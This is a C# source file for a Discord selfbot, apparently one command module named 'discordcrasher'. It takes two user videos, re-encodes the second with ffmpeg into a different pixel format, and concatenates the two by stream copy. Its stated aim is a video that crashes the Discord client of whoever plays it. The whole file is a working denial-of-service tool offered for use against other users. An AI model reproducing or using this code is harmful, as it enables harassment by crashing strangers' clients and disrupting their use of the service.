using Discord;
using Discord.Commands;
using System;
using System.Diagnostics;
using System.IO;

namespace RamokSelfbot.Commands.Utils
{
    [Command("discordcrasher", "Allow you to create a video that make crash the Discord Client of people that read the video. - UTILS")]
    class DiscordCrasher : CommandBase
    {
        [Parameter("path to the first video (spaces not supported)")]
        public string path1 { get; set; }  

        [Parameter("path to the second video (spaces not supported)")]
        public string path2 { get; set; }
        public override void Execute()
        {
            if(Message.Author.User.Id == Program.id)
            {
                Directory.CreateDirectory("discordcrasher");
                File.Copy(path1, "1.mp4");
                File.Copy(path2, "2.mp4");
                //on a les videos dans le dossier discordcrasher.
                int a = 0;
                if(File.Exists("ffmpeg.exe"))
                {
                    a++;
                }
                if(File.Exists("ffplay.exe"))
                {
                    a++;
                }
                if(File.Exists("ffprobe.exe"))
                {
                    a++;
                }
                if(a != 3)
                {
                    EmbedMaker aa = new EmbedMaker()
                    {
                        Color = RamokSelfbot.Utils.EmbedColor(),
                        Footer = RamokSelfbot.Utils.footer(Message.Author.User),
                        Description = "Please add theses 3 exe files in the main folder of the selfbot (" + RamokSelfbot.Utils.GetFileName() + ")\nLink to FFMPEG : https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-4.3.1-2021-01-26-full_build.7z"
                    };
                    RamokSelfbot.Utils.SendEmbed(Message, aa);
                    return;
                }
                //on crée le fichier "videos.txt"
                string text = "file 1.mp4\nfile 2_new.mp4";
                File.WriteAllText("discordcrasher\\videos.txt", text);

                Process start = new Process();
                start.StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/C ffmpeg.exe -i 2.mp4 -pix_fmt yuv444p 2_new.mp4",
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Normal
                };
                //2_new est crée
                start.Start();
                System.Threading.Thread.Sleep(5000);
                int bite = new Random().Next(0, 999);
                Process start2 = new Process();
                start2.StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/C ffmpeg -f concat -i discordcrasher\\videos.txt -codec copy discordcrasher\\crasher" + bite.ToString() + ".mp4",
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Normal
                };
                //2_new est crée
                start2.Start();
                EmbedMaker embed = new EmbedMaker()
                {
                    Color = RamokSelfbot.Utils.EmbedColor(),
                    Footer = RamokSelfbot.Utils.footer(Message.Author.User),
                    Description = "Discord crasher finished !"
                };
                embed.AddField("📁 Path to the file", RamokSelfbot.Utils.GetFileName() + "\\discordcrasher\\" + "crasher" + bite.ToString() + ".mp4", false);
                embed.AddField("🧹 Cleaning files in 2s", "Do not read the video or ur discord will crash");
                RamokSelfbot.Utils.SendEmbed(Message, embed);
                System.Threading.Thread.Sleep(2000);
                File.Delete("1.mp4");
                File.Delete("2.mp4");
                File.Delete("2_new.mp4");
            }
        }
    }
}  
